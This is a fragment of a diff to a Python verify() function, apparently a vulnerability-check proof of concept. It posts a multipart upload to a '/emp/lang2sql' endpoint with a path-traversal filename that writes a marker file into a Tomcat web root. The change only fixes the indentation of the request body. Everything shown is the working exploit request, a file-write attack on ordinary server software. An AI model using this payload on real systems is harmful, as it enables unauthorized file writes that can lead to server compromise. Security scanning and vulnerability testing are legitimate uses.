@@ -15,11 +15,13 @@ def verify(url):
         'Expect': '100-continue',
         'Connection': 'close'
     }
-    data = '''------WebKitFormBoundarymVk33liI64J7GQaK
-    Content-Disposition: form-data; name="file";filename="../../../../appsvr/tomcat/webapps/ROOT/9SIpL.txt"
+    data = '''
+------WebKitFormBoundarymVk33liI64J7GQaK
+Content-Disposition: form-data; name="file";filename="../../../../appsvr/tomcat/webapps/ROOT/9SIpL.txt"
 
-    b9Q2Itmn1
-    ------WebKitFormBoundarymVk33liI64J7GQaK--'''
+b9Q2Itmn1
+------WebKitFormBoundarymVk33liI64J7GQaK--
+'''
     vurl = urllib.parse.urljoin(url, "/emp/lang2sql?client_type=1&lang_tag=1")
     try:
         response = requests.post(vurl, headers=headers, data=data)
